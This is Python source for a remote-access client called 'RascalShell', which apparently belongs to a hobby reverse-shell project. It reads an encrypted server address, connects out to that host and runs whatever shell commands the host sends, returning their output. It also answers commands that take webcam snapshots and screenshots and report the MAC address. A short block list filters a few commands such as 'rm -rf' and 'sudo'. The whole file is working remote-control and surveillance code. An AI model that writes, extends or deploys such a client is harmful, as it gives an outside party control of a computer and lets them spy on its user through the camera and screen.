#!/usr/bin/env python3

import socket
import customtkinter
import subprocess
import os
import threading
from tkinter import *
from cryptography.fernet import Fernet
import sys
import re, uuid


class ClientNetwork(customtkinter.CTkFrame):
    def __init__(self, master, title):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)

        self.title = title
        self.title = customtkinter.CTkLabel(self, text=self.title, fg_color="#b50d55", font=("Roboto", 22), corner_radius=8)
        self.title.grid(row=0, column=0, padx=20, sticky="nsew", pady=(10,0))

        self.commandReceiver = customtkinter.CTkTextbox(self, font=("Open Sans", 17, "bold"), border_width=2, fg_color="black", bg_color="#23272E", border_color="#23272A", width=1000, height=400)
        self.commandReceiver.grid(row=2, column=0, sticky="w", padx=10, pady=10)

        self.thread = None

        thread = threading.Thread(target=self.client_socket, daemon=True)
        thread.start()

    def load_key(self):
        file = open("key.key", "rb")
        key = file.read()
        file.close()
        return key

    def decrypt_server_details(self, encrypted_details):
        key = self.load_key()
        cipher = Fernet(key)
        decrypted_details = cipher.decrypt(encrypted_details).decode()
        return decrypted_details

    def get_server(self):
        with open("server.txt", "rb") as server_file:
            encrypted_data = server_file.read()

        decrypted_data = self.decrypt_server_details(encrypted_data)

        for line in decrypted_data.splitlines():
            data = line.rstrip()
            self.ip, self.port = data.split("|")

    def client_socket(self):
        self.get_server()
        message = f"[?] Attempting to connect to: {self.ip}:{self.port}"
        self.commandReceiver.insert("end", message +"\n")
       
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.ip, int(self.port)))
        
        self.commandReceiver.tag_config("green", foreground="green")
        
        self.commandReceiver.insert("end", f"\n[+] Established a connection to: {self.ip}\n", "green")
        
        self.commandReceiver.yview(END)
        self.commandReceiver.update()


        current_dir = "/"
        
        self.blocked_commands = ["rm -rf", "ping", "sudo", "jpg", "jpgeg", "png"]

        while True:
            try:
                cmd = self.client.recv(1024).decode()

                if cmd.startswith("gma"):
                    self.client.send(f"Device Mac Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}".encode()) # gets the mac address. joins the elements of getnode() every 2 digits using a regex expression
                    self.commandReceiver.insert("end", "\n[~]" f"gma\n")
                    self.commandReceiver.insert("end", f"\tDevice Mac Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}" + "\n")
                    self.commandReceiver.yview(END)
                    self.commandReceiver.update()
                    continue

                if cmd.startswith("snapshot"):
                    self.client.send(f"snapshot received! Taking snapshot and sending...".encode())
                    self.commandReceiver.insert("end", "\n[~]"f"grab\n")
                    self.commandReceiver.insert("end", f"\tgrab received! Taking snapshot and sending..." + "\n")
                    self.commandReceiver.yview(END)
                    self.commandReceiver.update()
                    threading.Thread(target=self.capture_snapshot, daemon=True).start()
                    continue

                if cmd.startswith("grab"):
                    self.client.send(f"grab received! Image transferring...".encode())
                    self.commandReceiver.insert("end", "\n[~]"f"grab\n")
                    self.commandReceiver.insert("end", f"\tgrab received! Image transferring..." + "\n")
                    self.commandReceiver.yview(END)
                    self.commandReceiver.update()
                    threading.Thread(target=self.capture_screenshot, daemon=True).start()
                    continue
            
                for blocked_cmd in self.blocked_commands:
                    if cmd.strip().lower().startswith(blocked_cmd.lower()):
                        block_message = f"{blocked_cmd}: is a blocked command."
                        self.client.send(block_message.encode())
                        self.commandReceiver.insert("end", "\n[!]: " + block_message + "\n")
                        break
                else:
                    self.commandReceiver.insert("end", "\n[~]: " + cmd + "\n")
                    self.commandReceiver.yview(END)
                    self.commandReceiver.update()
                    if not cmd.strip(): # checks if the cmd variable is empty or only has white spaces. if so, the continue statement skips. avoids processing white space only commands
                        continue

                    if cmd.startswith("cd"): # if the command recieved starts with cd it means the directory is about to be changed
                        new_dir = cmd.split(" ")[1] # extracts the new directory path from the cmd variable, the split() method splits the string into a list of words based on whitespace characters. the 1 extracts the second word(directory)
                        try:
                            os.chdir(new_dir) # just change to the directory specified with the command receieved using os
                            current_dir = os.getcwd()
                            self.client.send(f"Changed Directory to: {current_dir}".encode())
                            print(f"Changed Directory to: {current_dir}")
                        except Exception as e:
                            self.client.send(f"Error: {e}".encode())
                    else:
                        output = subprocess.getoutput(cmd)
                        output_lines = ["\t" + line for line in output.split("\n")] # iterate over evert line in output and then add a tab to the start of each line
                        self.client.send(output.encode())
                        self.commandReceiver.insert("end", "\n".join(output_lines) + "\n")
                        self.commandReceiver.yview(END)
                        self.commandReceiver.update()
            except Exception as e:
                print(f"Error: {e}")
                break

    def capture_screenshot(self):
        try:
            python_command = sys.executable
            subprocess.run([python_command, 'image_sender.py', 'screenshot.png'], check=True)
        except Exception as error:
            self.client.send("something went wrong...".encode())

    def capture_snapshot(self):
        try:
            python_command = sys.executable
            subprocess.run([python_command, 'cam_sender.py', 'cam.png'], check=True)
        except Exception as error:
            self.client.send("something went wrong...".encode())


class ClientShell(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        customtkinter.set_default_color_theme("blue")
        customtkinter.set_appearance_mode("dark")

        self.geometry("1060x600")
        self.resizable(False, False)
        
        self.title(f"RascalShell: Client")

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        self.networkFrame = ClientNetwork(self, "Client Networking")
        self.networkFrame.grid(row=0, column=1, padx=20, pady=10, columnspan=2, sticky="nsew")
        
if __name__ == "__main__":
    app = ClientShell()
    app.mainloop()
